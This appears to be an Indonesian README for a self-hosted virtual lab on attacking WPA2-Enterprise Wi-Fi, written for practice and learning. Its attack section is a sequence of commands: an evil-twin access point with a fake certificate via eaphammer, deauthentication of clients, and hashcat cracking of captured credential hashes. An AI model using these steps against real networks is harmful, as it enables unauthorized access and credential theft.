# Lab WPA2-Enterprise

## Instal Tools

```
sudo apt-get update
sudo apt-get install git iw hostapd dnsmasq wpasupplicant isc-dhcp-client freeradius aircrack-ng eaphammer
```

## Kloning Repositori

```
git clone https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/
cd Lab-Virtual-Wireless-Hacking/lab/wpa2-enterprise
chmod +x lab-wpa2-enterprise.sh
```

## Konfigurasi FreeRADIUS

```bash
sudo tee -a /etc/freeradius/3.0/users < radius/users
sudo mv radius/eap /etc/freeradius/3.0/mods-available/
sudo systemctl restart freeradius
sudo systemctl enable freeradius
radtest ucup ucup123 127.0.0.1 1812 testing123
radtest adit adit123 127.0.0.1 1812 testing123
radtest juned juned123 127.0.0.1 1812 testing123
```

## Jalankan LAB

```
sudo ./lab-wpa2-enterprise.sh
```

## Jalankan Serangan

#### 1. Aktifkan mode monitor:


```
sudo airmon-ng start wlan1
```

#### 2. Scan jaringan Wi-Fi WPA/WPA2:

```
sudo airodump-ng -t wpa wlan1mon
```

Cari jaringan Wi-Fi WPA/WPA2 dengan nilai `MGT` pada kolom `AUTH`.

#### 3. Buat sertifikat palsu:

```
sudo eaphammer --cert-wizard
```

#### 4. Jalankan EAPHammer:

```
sudo eaphammer -i wlan1mon --channel [channel] --auth wpa-eap --essid [essid] --creds
```

#### 5. Set channel interface:

```
sudo airmon-ng start wlan1 [channel]
```

#### 6. Jalankan serangan deauth:

```
sudo aireplay-ng -0 10 -a [bssid] -c [mac_client] wlan1mon
```

#### 7. Crack hash:

```
hashcat -a 0 -m 5500 [file_hash] [file_wordlist]
```
